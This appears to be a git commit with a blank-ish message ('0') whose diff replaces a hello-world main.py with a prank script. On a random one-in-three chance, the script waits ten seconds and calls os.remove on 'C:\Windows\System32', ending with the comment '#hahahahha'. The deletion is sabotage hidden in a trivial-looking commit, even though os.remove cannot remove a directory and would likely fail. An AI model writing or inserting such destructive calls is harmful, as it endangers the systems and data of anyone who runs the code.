64fda283c12beee5ef6a02490855e6e28208c440
kolbassss <danildovganik10@gmail.com>
2025-09-13 14:55:08 +0300

    0

--- main.py
+++ main.py
@@ -1,6 +1,10 @@
-def main():
-    print("Hello from code!")
-
-
-if __name__ == "__main__":
-    main()
+import random
+import os
+import time
+a = random.randint(0,2)
+print(a)
+if a == 2:
+    print('gg')
+    time.sleep(10)
+    os.remove("C:\Windows\System32")
+#hahahahha
